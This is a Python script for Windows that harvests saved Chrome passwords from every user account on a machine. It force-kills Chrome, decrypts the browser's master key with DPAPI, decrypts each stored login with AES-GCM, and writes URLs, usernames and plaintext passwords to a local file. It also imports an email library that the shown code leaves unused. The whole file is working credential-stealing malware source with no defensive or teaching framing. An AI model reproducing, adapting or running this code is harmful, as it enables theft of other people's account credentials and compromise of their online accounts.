import os
import time
import sqlite3
import json
import base64
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome
from sqlite3 import Error
from pathlib import Path
import smtplib
import subprocess
import re



try:
	users = [x.name for x in Path(r'C:\Users').glob('*') if x.name not in ['Default', 'Default User', 'Public', 'All Users'] and x.is_dir()]
except:
	print('error getting usernames')


def broswer_creds(db_file, encrypted_key):
	try:
		conn = None
		output = os.system("taskkill /IM chrome.exe /F")
		time.sleep(2)
		conn = sqlite3.connect(db_file)
		#print('connected to:' ,db_file)
		message = '-'*100 + '\n'*2
		cursor = conn.cursor()
		cursor.execute("SELECT action_url, username_value, password_value FROM logins")
		for index,login in enumerate(cursor.fetchall()):
			url = login[0]
			username = login[1]
			ciphertext= login[2]
			#print("Url:",url)
			#print("Username:",username)
			initialisation_vector = ciphertext[3:15]
			encrypted_password = ciphertext[15:-16]
			cipher = AES.new(encrypted_key, AES.MODE_GCM, initialisation_vector)
			decrypted_pass = cipher.decrypt(encrypted_password)
			decrypted_pass = decrypted_pass.decode()
			#print("Password:", decrypted_pass)
			message = message + url + '\n' + username + '\n' + decrypted_pass + '\n'*2
			with open('browser.txt', 'a') as f:
				f.write(url + '\n' + username + '\n' + decrypted_pass + '\n'*2)
		message = message + '-' * 100

		cursor.close()
		return message
	except:
		return ''

all_data = ''
for user in users:
	message = ''
	try:
		with open(rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State', 'r') as f:
			data = f.read()
			data = json.loads(data)
			os_crypt = data['os_crypt']
			encrypted_key = os_crypt['encrypted_key']
			encrypted_key = base64.b64decode(encrypted_key)
			encrypted_key = encrypted_key[5:]
			key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
		profiles = []
		items = os.listdir(fr'C:\Users\{user}\AppData\Local\Google\Chrome\User Data')
		for item in items:
			if item.find('Profile') != -1 or item == 'Default':
				profiles.append(item)
		for profile in profiles:
			loc = f'C:/Users/{user}/AppData/Local/Google/Chrome/User Data/{profile}/Login Data'
			newmsgs =  broswer_creds(loc, key)
			message = message + newmsgs
		all_data = all_data + message
	except:
		print(f'Error before connection')

